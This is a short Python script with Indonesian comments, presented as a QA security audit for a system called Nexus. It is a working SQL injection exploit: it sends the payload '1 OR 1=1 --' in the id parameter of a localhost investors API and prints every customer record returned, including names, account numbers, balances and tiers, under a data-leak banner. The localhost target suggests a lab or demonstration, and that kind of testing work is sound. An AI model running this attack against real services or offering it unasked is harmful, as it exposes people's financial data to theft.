"""
Nexus Cyber - Security Reverse-Check (QA Audit)
===============================================
Skrip ini mengeksploitasi kerentanan SQL Injection pada 
Financial Data Center API ketiadaan sistem Nexus. 
Payload "1 OR 1=1" memaksa database memberikan SEMUA record nasabah (termasuk admin rahasia).
"""
import requests
import json
import sys

# Target API rentan (bypass Nexus Gateway)
TARGET_API = "http://localhost:3001/api/investors"

def hack_database():
    print("[*] MENGINISIASI SERANGAN SQL INJECTION (BYPASS NEXUS)")
    print(f"[*] Target Endpoint : {TARGET_API}")

    # Payload memanipulasi string "WHERE id = 1 OR 1=1" -> Evaluate True untuk semua baris
    # Tambahkan "--" (komentar SQL) untuk mengabaikan sisa syntax bila ada.
    sqli_payload = "1 OR 1=1 --"
    print(f"[*] Malicious Payload: {sqli_payload}\n")

    try:
        # Kirim request GET dengan payload
        res = requests.get(TARGET_API, params={"id": sqli_payload}, timeout=5)
        
        if res.status_code == 200:
            data_json = res.json()
            
            if data_json.get("status") == "success":
                data_dump = data_json.get("data", [])
                
                print("==================================================")
                print("      [!!!] DATA LEAK KEUANGAN BERHASIL [!!!]     ")
                print("==================================================")
                print(f"Total Nasabah Terekspos: {len(data_dump)} accounts.")
                print(f"Query Eksekutor Backend: {data_json.get('query_executed', '')}\n")
                
                for account in data_dump:
                    print(f" - ID: {account['id']} | NAMA: {account['name']} | "
                          f"REKENING: {account['account']} | SALDO: Rp {account['balance']:,.2f} | "
                          f"TIER: {account['tier']}")
            else:
                # Menampikan pesan error database (sebagai feedback reconnaissance intel)
                print(f"[-] GAGAL (Atau DB Error):\n{data_json.get('message')}")
        else:
            print(f"[-] HTTP Error: {res.status_code}")

    except Exception as e:
        print(f"[-] Koneksi gagal: {e}")

if __name__ == "__main__":
    # Menghindari error ASCII pada terminal Powershell
    sys.stdout.reconfigure(encoding='utf-8')
    hack_database()
